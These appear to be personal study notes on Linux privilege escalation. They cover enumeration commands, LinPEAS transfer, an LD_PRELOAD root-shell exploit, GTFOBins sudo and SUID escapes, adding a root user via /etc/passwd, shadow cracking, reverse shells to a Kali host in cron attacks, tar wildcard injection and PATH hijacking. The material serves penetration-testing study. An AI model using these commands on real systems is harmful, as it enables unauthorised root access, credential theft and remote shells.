# Linux Privilege Escalation — Study Notes

---

## Post-Exploitation Enumeration Commands

| Command | Purpose | Privesc Value | Category |
|---|---|---|---|
| `hostname` | Machine name | May reveal role in network (e.g. SQL-PROD-01) | System |
| `uname -a` | Kernel version and architecture | Find kernel exploits | System |
| `cat /proc/version` | Kernel + GCC version | Compiler presence = exploit compilation | System |
| `cat /etc/issue` | OS info | Distro-specific exploit research | System |
| `id` | UID, GID, group memberships | Dangerous groups: docker, sudo, disk | User |
| `sudo -l` | Commands runnable with sudo | NOPASSWD binary → check GTFOBins | Privesc |
| `cat /etc/passwd` | All system users | List real users; brute-force targets | User |
| `env` | Environment variables | Credentials in env? Compiler in PATH? | Privesc |
| `history` | Command history | Cleartext passwords/usernames | User |
| `ps aux` | All users' processes | Vulnerable services running as root | System |
| `ps axjf` | Process tree | Parent-child relationships | System |
| `ifconfig` / `ip a` | Network interfaces | Dual NIC = potential pivot point | Network |
| `ip route` | Routing table | Reachable internal network segments | Network |
| `netstat -ano` | Active connections + ports | Localhost-only services; exploitable from inside | Network |
| `netstat -tp` | Connection → PID mapping | Which process owns which port | Network |
| `ls -la` | List including hidden files | Credential files, configs, .ssh dirs | File |
| `find / -perm -u=s -type f 2>/dev/null` | SUID binaries | SUID binary runs as owner → root escalation | Privesc |
| `find / -writable -type d 2>/dev/null` | World-writable directories | PATH hijacking or malicious script placement | Privesc |
| `find / -perm 0777 -type f 2>/dev/null` | World rwx files | Modify scripts executed by root | Privesc |
| `find / -name python* 2>/dev/null` | Development tools | Interpreter available for exploit execution | File |
| `find / -mtime 10 2>/dev/null` | Files modified in last 10 days | Catches recent deploys or changed configs | File |

---

## Linux Privesc Enumeration Tools

| Tool | Language | Focus | Dependency | Maintained | When to Use |
|---|---|---|---|---|---|
| **LinPEAS** | Bash | General privesc (broad coverage) | None | ✅ Active | Always first choice |
| **LinEnum** | Bash | General enumeration | None | ⚠️ Unmaintained | If LinPEAS fails |
| **LES** | Bash | Kernel exploits only | None | ✅ Active | Finding kernel CVEs |
| **LSE** | Bash | General (leveled verbosity) | None | ✅ Active | Clean, less noisy output |
| **LinuxPrivChecker** | Python | Basic enumeration | Python | ⚠️ Unmaintained | If Python available, others not |

### GitHub Links
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- LSE (Linux Smart Enumeration): https://github.com/diego-treitos/linux-smart-enumeration
- LinuxPrivChecker: https://github.com/linted/linuxprivchecker

### Transferring Tools to Target
```bash
# On Kali — start HTTP server
python3 -m http.server 8000

# On target
cd /tmp
wget http://<KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Writable Directories for Dropping Files
```
/tmp        — always writable, standard drop location
/dev/shm    — RAM-based, deleted on reboot, less visible to IDS
/var/tmp    — like /tmp but survives reboot
```

### LinPEAS Color Coding
- **Red/Yellow** → 95% a privilege escalation vector
- **Red** → must investigate
- Treat output like search results — scroll to highlighted findings, ignore the rest

---

## Sudo Privilege Escalation

### Reference
GTFOBins: https://gtfobins.github.io — search any binary from `sudo -l` output, select "sudo" filter.

### Leverage Application Functions
Some applications expose internal functionality that can be abused when run with sudo.

**Apache2 — file read via error message:**
```bash
sudo apache2 -f /etc/shadow
# Apache expects a config file; prints first line of /etc/shadow in error output
```

### Leverage LD_PRELOAD
`LD_PRELOAD` tells the linker which shared library to load before anything else. If `sudoers` contains `env_keep+=LD_PRELOAD`, it can be exploited.

**Check:**
```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

**Exploit:**
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_permitted_binary>
```

### Common GTFOBins Sudo Vectors

**find:**
```bash
sudo find . -exec /bin/bash \; -quit
```

**less:**
```bash
sudo less /etc/passwd
# inside less:
!bash
```

**nano:**
```bash
sudo nano
# inside nano:
Ctrl+R → Ctrl+X
reset; bash 1>&0 2>&0
```

**nmap (old versions 2.02–5.21):**
```bash
sudo nmap --interactive
nmap> !sh
```

**nmap (any version — NSE):**
```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

---

## SUID Privilege Escalation

### What is SUID?
When a binary has the SUID bit set, it runs with the **file owner's** privileges instead of the executing user's. Root-owned SUID binaries = runs as root.

### Find SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
# or
find / -type f -perm -04000 -ls 2>/dev/null
```

Check results against GTFOBins: https://gtfobins.github.io/#+suid

### Common SUID Exploit Examples

**bash:**
```bash
bash -p
# -p preserves effective UID → root shell
```

**find:**
```bash
find . -exec /bin/sh -p \; -quit
```

**base64 (file read):**
```bash
base64 /etc/shadow | base64 --decode
```

**Adding a root user via /etc/passwd (if writable):**
```bash
# Generate password hash on Kali
openssl passwd -1 -salt hack password123

# Append to /etc/passwd
echo 'hacker:$1$hack$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# password: password123
whoami  # root
```

### unshadow + John the Ripper
```bash
# Read both files (using SUID base64 if needed)
base64 /etc/passwd | base64 --decode > /tmp/passwd.txt
base64 /etc/shadow | base64 --decode > /tmp/shadow.txt

# On Kali
unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### SUID vs Sudo

| | SUID | Sudo |
|---|---|---|
| Trigger | Permission bit on binary | sudoers configuration |
| Check | `find / -perm -u=s` | `sudo -l` |
| Reference | GTFOBins → SUID filter | GTFOBins → Sudo filter |

---

## Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities.

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_writeup_capabilities.md).

---

## Cron Job Privilege Escalation

### What are Cron Jobs?

Cron is a Linux task scheduler. System-level cron jobs typically run as root. If a root-owned cron job executes a script that a low-privilege user can modify, arbitrary commands can be executed as root.

### Crontab Syntax

```
# m  h  dom  mon  dow  command
  *  *   *    *    *   /path/to/script.sh
```

| Field        | Values           |
| ------------ | ---------------- |
| minute       | 0–59             |
| hour         | 0–23             |
| day of month | 1–31             |
| month        | 1–12             |
| day of week  | 0–6 (0 = Sunday) |

`* * * * *` = every minute.

### Enumeration

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ps aux | grep cron
```

### Attack Scenario 1 — Writable Script

Crontab contains:

```
* * * * *  root  /home/karen/backup.sh
```

Check permissions:

```bash
ls -la /home/karen/backup.sh
# if karen owns it or it's world-writable:
echo '#!/bin/bash' > /home/karen/backup.sh
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /home/karen/backup.sh
chmod +x /home/karen/backup.sh
```

On Kali:

```bash
nc -lvnp 4444
```

### Attack Scenario 2 — PATH Hijacking

Crontab contains:

```
PATH=/home/karen:/usr/local/sbin:/usr/local/bin

* * * * *  root  backup.sh
```

Script is called without full path and a writable directory is first in PATH:

```bash
echo '#!/bin/bash' > /home/karen/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/karen/backup.sh
chmod +x /home/karen/backup.sh
# wait for cron, then:
/tmp/rootbash -p
```

### Attack Scenario 3 — Wildcard Injection

Script contains:

```bash
cd /home/user/backup && tar cf backup.tar *
```

The `*` expands to filenames before tar runs. Filenames starting with `--` are interpreted as flags:

```bash
cd /home/user/backup
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
```

When cron runs tar, the filenames are passed as arguments → shell executes as root.

Other tools vulnerable to wildcard injection: `rsync`, `7z`, `find`.

### Key Notes

- Always `chmod +x` the script — cron requires execute permission
- If the script references a non-existent path, it will fail silently — overwrite the script itself instead
- Check `/var/log/syslog` for cron execution logs (requires elevated privileges)

For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_writeup_cronjobs.md).

---

## PATH Privilege Escalation

### What is PATH?

`PATH` is an environment variable that tells the shell where to look for executables when a command is typed without a full path. The shell searches each directory left to right and runs the first match.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### How PATH Works

When you type a command, the shell searches each directory in PATH from left to right and executes the first match it finds:

```
Command typed: ls

Step 1: check /usr/local/sbin/ls  → not found
Step 2: check /usr/local/bin/ls   → not found
Step 3: check /usr/sbin/ls        → not found
Step 4: check /usr/bin/ls         → not found
Step 5: check /sbin/ls            → not found
Step 6: check /bin/ls             → FOUND → execute
```

If you prepend a directory to PATH, it becomes the first place the shell looks:

```bash
export PATH=/tmp:$PATH
# PATH is now: /tmp:/usr/local/sbin:/usr/local/bin:...

# typing "ls" now checks /tmp/ls first
# if /tmp/ls exists → runs it instead of /bin/ls
```

This is by design for legitimate use cases (e.g. project-local binaries). The privesc opportunity arises when a privileged process uses PATH carelessly.

### Why is it a Privesc Vector?

If a SUID binary or root-owned script calls a command **without its full path**, and you can inject a writable directory at the beginning of PATH, you can create a malicious binary with the same name — it gets executed instead of the real one, with root privileges.

### Does it Require Root Access?

No. `PATH` is just an environment variable — any user can modify their own session's PATH:

```bash
export PATH=/tmp:$PATH
```

The vulnerability is not in PATH itself — it's in a SUID binary that calls a command carelessly. When a SUID binary runs, it runs with root's effective UID but **inherits the executing user's environment**, including the modified `$PATH`. Unless the binary explicitly resets PATH, it uses whatever PATH your session has.

### When Does it NOT Work?

|Situation|Result|
|---|---|
|Binary uses full paths (`/usr/bin/curl`)|Not exploitable|
|Binary calls `env -i` to clear environment|Not exploitable|
|`secure_path` set in sudoers|Sudo ignores your PATH|
|Binary is not SUID / not run as root|No privilege gain|

### Attack Flow

**1. Find writable directories:**

```bash
find / -writable -type d 2>/dev/null
```

Look for unusual writable directories — not `/tmp`, `/dev/shm`, `/run/user/...` (expected), but things like another user's home directory (misconfiguration).

**2. Find a vulnerable SUID binary:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**3. Analyze what commands it calls:**

```bash
# if strings is available
strings /path/to/suid_binary

# practical alternative when binutils not installed
ltrace /path/to/suid_binary
```

`ltrace` intercepts library calls and prints them in human-readable form. Look for `system("command")` where `command` has no full path.

**4. Create a malicious binary with the same name:**

```bash
echo '/bin/bash' > /writable/dir/command_name
chmod +x /writable/dir/command_name
```

**5. Inject the writable directory at the beginning of PATH:**

```bash
export PATH=/writable/dir:$PATH
```

**6. Run the SUID binary:**

```bash
/path/to/suid_binary
# calls "command" → finds your malicious version first → spawns bash as root
```

**7. Restore PATH after the exercise:**

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Key Principles

- Write access to another user's home directory is always a misconfiguration — it enables file planting attacks like PATH hijacking
- `ltrace` is the practical alternative to `strings` when binutils is not installed
- The attack only works if the binary calls a command without its full path — always verify with `ltrace` or `strings` before assuming exploitability
- A SUID binary inherits the executing user's environment — PATH modification requires no root access

For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/Linux_Privesc_Writeup_PATH.md)

---

